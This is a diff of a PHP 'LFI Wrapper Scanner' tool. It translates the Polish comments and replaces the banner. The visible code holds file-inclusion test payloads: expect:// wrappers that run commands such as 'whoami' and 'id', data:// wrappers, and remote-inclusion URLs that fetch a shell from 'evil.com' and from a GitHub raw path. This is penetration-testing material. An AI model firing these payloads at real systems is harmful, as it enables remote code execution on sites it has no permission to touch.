@@ -100,7 +100,7 @@ class LFIWrapperScanner {
             }
         }
         
-        // Data wrapper (dla PHP < 8.0)
+        // Data wrapper  PHP < 8.0
         $dataWrappers = [
             'data://text/plain;base64,',
             'data://text/plain,',
@@ -112,12 +112,12 @@ class LFIWrapperScanner {
             $wrappers[] = $wrapper . $testContent;
         }
         
-        // Expect wrapper (jeśli allow_url_include=1)
+        // Expect wrapper 
         $wrappers[] = 'expect://whoami';
         $wrappers[] = 'expect://id';
         $wrappers[] = 'expect://ls';
         
-        // HTTP wrapper (dla testów RFI)
+        // HTTP wrapper
         $wrappers[] = 'http://evil.com/shell.txt';
         $wrappers[] = 'https://raw.githubusercontent.com/evil/shell/master/shell.php';
         
@@ -266,12 +266,14 @@ class LFIWrapperScanner {
     
     public function showBanner() {
         $banner = $this->color("
-   _      ______ _____    _       __        __    _                  
-  | |    |  ____|  __ \\  | |      \\ \\      / /   | |                 
-  | |    | |__  | |__) | | |       \\ \\ /\\ / /___ | |__   ___  _ __   
-  | |    |  __| |  _  /  | |        \\ V  V // _ \\| '_ \\ / _ \\| '_ \\  
-  | |____| |____| | \\ \\  | |____     \\_/\\_/ \\___/| |_) | (_) | | | | 
-  |______|______|_|  \\_\\ |______|                 |_.__/ \\___/|_| |_| 
+                           _          _____      
+ __      ___ __ __ _ _ __ | |__  _ __|___ / _ __ 
+ \ \ /\ / / '__/ _` | '_ \| '_ \| '_ \ |_ \| '__|
+  \ V  V /| | | (_| | |_) | | | | |_) |__) | |   
+   \_/\_/ |_|  \__,_| .__/|_| |_| .__/____/|_|   
+                    |_|         |_|              
+    PHP Wrappers LFI Tester 
+                                 by csshark
                                                                   
         ", 'cyan') . "
         " . $this->color("LFI Wrapper Scanner v1.0", 'yellow') . "
